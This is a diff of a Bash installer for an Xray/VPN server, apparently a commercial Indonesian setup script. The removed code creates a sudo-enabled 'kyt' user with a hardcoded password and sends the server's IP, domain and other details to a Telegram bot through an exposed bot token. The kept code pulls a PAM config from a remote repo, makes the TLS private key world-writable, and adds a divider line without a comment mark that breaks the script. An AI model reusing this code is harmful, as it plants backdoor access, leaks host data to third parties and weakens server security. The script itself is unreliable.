@@ -105,64 +105,7 @@ echo $host1 > /root/domain
 }
 #══════════════════════════════⊹⊱≼≽⊰⊹══════════════════════════════
 
-function password_default() {
-    domain=$(cat /root/domain)
-    MYIP=$(curl -sS ipv4.icanhazip.com)
-    userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
-
-    #Bot massage
-date1=$(date +"%Y-%m-%d")
-
-ip_address=$(curl -s https://ipinfo.io/ip)
-isp=$(curl -s https://ipinfo.io/$ip_address/org)
-nama_isp=$(echo $isp | cut -d' ' -f2-)
-
-ram=$(free -m | awk '/Mem:/ {print $2}')
-if [ $ram -le 3000 ]; then
-    garansi=10
-else
-    garansi=30
-fi
-
-    CHATID="576495165"
-    KEY="6933923564:AAHC1esXFo0eLFFaRxNv7woM0yEu5-pM6wY"
-    TIME="10"
-    URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT=" ============================
- DETAIL ORDER BY SANSTORE
-============================
-<code>Tanggal      :</code> <code>$date1</code>
-<code>ISP          :</code> <code>$nama_isp</code>
-<code>IP Vps       :</code> <code>$MYIP</code>
-<code>OS Vps       :</code> <code>$OS_Name</code>
-<code>Domain       :</code> <code>$domain</code>
-<code>User Script  :</code> <code>$username</code>
-<code>Expired      :</code> <code>$exp</code>
-<code>Password     :</code> <code>@1Vpsbysan</code>
-============================
-☢️Rules :
-No Change Password
-Garansi $garansi Hari (jika Suspen)
-1x Claim Garansi
-No CPU 100%
-Don't Get DDOS
-Don't Use VPS For MINING, HACK, &  ILLEGAL ACTIVTY
-"
-
-   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-}
-
-clear
-# Pasang SSL
 function pasang_ssl() {
-clear
-print_install "Memasang SSL Pada Domain"
     rm -rf /etc/xray/xray.key
     rm -rf /etc/xray/xray.crt
     domain=$(cat /root/domain)
@@ -178,16 +121,12 @@ print_install "Memasang SSL Pada Domain"
     /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
     ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
     chmod 777 /etc/xray/xray.key
-    print_success "SSL Certificate"
+    
 }
 
+#══════════════════════════════⊹⊱≼≽⊰⊹══════════════════════════════
+
 function make_folder_xray() {
-rm -rf /etc/vmess/.vmess.db
-    rm -rf /etc/vless/.vless.db
-    rm -rf /etc/trojan/.trojan.db
-    rm -rf /etc/shadowsocks/.shadowsocks.db
-    rm -rf /etc/ssh/.ssh.db
-    rm -rf /etc/bot/.bot.db
     mkdir -p /etc/bot
     mkdir -p /etc/xray
     mkdir -p /etc/vmess
@@ -198,37 +137,16 @@ rm -rf /etc/vmess/.vmess.db
     mkdir -p /usr/bin/xray/
     mkdir -p /var/log/xray/
     mkdir -p /var/www/html
-    mkdir -p /etc/kyt/limit/vmess/ip
-    mkdir -p /etc/kyt/limit/vless/ip
-    mkdir -p /etc/kyt/limit/trojan/ip
-    mkdir -p /etc/kyt/limit/ssh/ip
-    mkdir -p /etc/limit/vmess
-    mkdir -p /etc/limit/vless
-    mkdir -p /etc/limit/trojan
-    mkdir -p /etc/limit/ssh
     chmod +x /var/log/xray
     touch /etc/xray/domain
     touch /var/log/xray/access.log
-    touch /var/log/xray/error.log
-    touch /etc/vmess/.vmess.db
-    touch /etc/vless/.vless.db
-    touch /etc/trojan/.trojan.db
-    touch /etc/shadowsocks/.shadowsocks.db
-    touch /etc/ssh/.ssh.db
-    touch /etc/bot/.bot.db
-    echo "& plughin Account" >>/etc/vmess/.vmess.db
-    echo "& plughin Account" >>/etc/vless/.vless.db
-    echo "& plughin Account" >>/etc/trojan/.trojan.db
-    echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
-    echo "& plughin Account" >>/etc/ssh/.ssh.db
+    touch /var/log/xray/error.log 
     }
 
-#Instal Xray
+#══════════════════════════════⊹⊱≼≽⊰⊹══════════════════════════════
+
 function install_xray() {
-clear
-    print_install "Core Xray 1.8.1 Latest Version"
     # install xray
-    #echo -e "[ ${green}INFO$NC ] Downloading & Installing xray core"
     domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
     chown www-data.www-data $domainSock_dir
     
@@ -284,12 +202,11 @@ LimitNOFILE=1000000
 WantedBy=multi-user.target
 
 EOF
-print_success "Konfigurasi Packet"
 }
 
+══════════════════════════════⊹⊱≼≽⊰⊹══════════════════════════════
+
 function ssh(){
-clear
-print_install "Memasang Password SSH"
     wget -O /etc/pam.d/common-password "${REPO}ssh/password"
 chmod +x /etc/pam.d/common-password
 
@@ -313,7 +230,6 @@ chmod +x /etc/pam.d/common-password
     debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
     debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
 
-# go to root
 cd
 
 # Edit file /etc/systemd/system/rc-local.service
@@ -357,131 +273,10 @@ ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
 
 # set locale
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
-print_success "Password SSH"
 }
 
-function udp_mini(){
-clear
-print_install "Memasang Service Limit Quota"
-wget -q -O /usr/local/sbin/quota "${REPO}limit/quota"
-chmod +x /usr/local/sbin/quota
-chmod + x /usr/local/sbin/quota
-cd /usr/local/sbin/
-sed -i 's/\r//' quota
-cd
-wget -q -O /usr/bin/limit-ip "${REPO}limit/limit-ip"
-chmod +x /usr/bin/*
-cd /usr/bin
-sed -i 's/\r//' limit-ip
-cd
-clear
-#SERVICE LIMIT ALL IP
-cat >/etc/systemd/system/vmip.service << EOF
-[Unit]
-Description=My
-ProjectAfter=network.target
 
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/bin/limit-ip vmip
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart vmip
-systemctl enable vmip
-
-cat >/etc/systemd/system/vlip.service << EOF
-[Unit]
-Description=My
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/bin/limit-ip vlip
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart vlip
-systemctl enable vlip
-
-cat >/etc/systemd/system/trip.service << EOF
-[Unit]
-Description=My
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/bin/limit-ip trip
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart trip
-systemctl enable trip
-#SERVICE LIMIT QUOTA
-
-#SERVICE VMESS
-cat >/etc/systemd/system/qmv.service << EOF
-[Unit]
-Description=My
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/local/sbin/quota vmess
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart qmv
-systemctl enable qmv
-
-#SERVICE VLESS
-cat >/etc/systemd/system/qmvl.service << EOF
-[Unit]
-Description=My 
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/local/sbin/quota vless
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart qmvl
-systemctl enable qmvl
-
-#SERVICE TROJAN
-cat >/etc/systemd/system/qmtr.service << EOF
-[Unit]
-Description=My 
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/local/sbin/quota trojan
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart qmtr
-systemctl enable qmtr
-# // Installing UDP Mini
+function instal_udp(){
 mkdir -p /usr/local/kyt/
 wget -q -O /usr/local/kyt/udp-mini "${REPO}badvpn/udp-mini"
 chmod +x /usr/local/kyt/udp-mini
